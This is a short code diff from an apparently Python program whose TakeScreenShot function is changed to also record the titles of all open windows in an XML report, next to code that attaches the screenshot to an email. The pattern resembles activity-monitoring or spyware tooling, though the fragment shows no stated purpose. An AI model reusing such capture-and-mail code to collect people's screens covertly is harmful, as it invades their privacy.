@@ -78,7 +78,10 @@ def TakeScreenShot():
                 imgByteArr.getvalue()).hexdigest()
         except AttributeError:
             pass
-
+        XML_Windows = ET.SubElement(root,"Windows")
+        for window in GetWindows():
+            ET.SubElement(XML_Windows,"Window").text =window
+        
         #######Test
         msg = MIMEMultipart()
         imgMime = email.mime.image.MIMEImage(imgByteArr.getvalue())
